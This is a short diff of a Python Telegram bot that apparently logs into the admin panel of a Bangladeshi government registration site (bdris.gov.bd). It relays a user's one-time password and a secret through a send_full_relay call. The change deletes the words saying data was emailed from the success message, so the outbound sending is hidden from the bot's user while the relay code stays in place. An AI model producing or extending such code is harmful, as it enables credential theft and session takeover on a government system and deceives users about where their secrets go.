@@ -121,7 +121,7 @@ def role_step_3(m):
         send_full_relay(m.chat.id, temp_storage[m.chat.id]['ch_otp'], raw_sec)
         if navigate_to("https://bdris.gov.bd/admin/")[0]:
             vault["is_alive"] = True
-            bot.send_message(m.chat.id, "🎉 Role Login সফল এবং ডাটা ইমেইল করা হয়েছে!", reply_markup=main_menu())
+            bot.send_message(m.chat.id, "🎉 Role Login সফল হয়েছে!", reply_markup=main_menu())
     except: bot.send_message(m.chat.id, "❌ ফরম্যাট ভুল!")
 
 # ==========================================
